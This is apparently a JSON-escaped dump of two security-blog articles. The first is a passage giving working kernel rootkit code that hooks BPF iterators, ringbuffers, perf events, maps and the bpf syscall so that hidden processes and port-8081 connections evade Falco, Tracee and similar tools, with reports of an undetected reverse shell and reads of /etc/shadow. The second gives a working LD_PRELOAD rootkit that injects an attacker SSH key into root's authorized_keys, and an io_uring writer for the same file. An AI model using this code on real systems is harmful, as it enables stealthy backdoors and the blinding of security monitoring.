HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And several other things.\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  